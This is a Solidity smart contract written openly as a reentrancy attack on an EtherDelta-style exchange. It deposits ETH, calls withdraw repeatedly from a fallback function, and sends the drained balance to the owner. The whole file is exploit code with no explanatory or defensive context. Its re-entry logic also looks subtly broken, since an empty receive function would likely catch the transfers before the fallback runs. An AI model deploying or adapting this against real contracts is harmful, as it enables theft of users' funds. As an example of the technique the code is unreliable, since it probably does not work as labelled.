// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEtherDelta {
    function deposit() external payable;
    function withdraw(uint amount) external;
    function balanceOf(address token, address user) external view returns (uint);
}

contract AttackContract {
    IEtherDelta public target;
    address public owner;

    constructor(address _target) {
        target = IEtherDelta(_target);
        owner = msg.sender;
    }

    // Function to deposit ETH to this contract by the owner
    function deposit() external payable {
        require(msg.sender == owner, "Only the owner can deposit funds");
    }

    // Deposit ETH to the target (EtherDelta)
    function depositToTarget() external payable {
        target.deposit{value: msg.value}();
    }

    // Trigger the reentrancy attack
    function attack(uint amount) external {
        require(msg.sender == owner, "Only the owner can initiate the attack");
        target.withdraw(amount);
    }

    // Receive ether function for the fallback mechanism
    receive() external payable {}

    // Reentrancy attack
    fallback() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }

    // Allow the owner to withdraw funds after the attack
    function withdrawFunds() external {
        require(msg.sender == owner, "Only the owner can withdraw funds");
        payable(owner).transfer(address(this).balance);
    }
}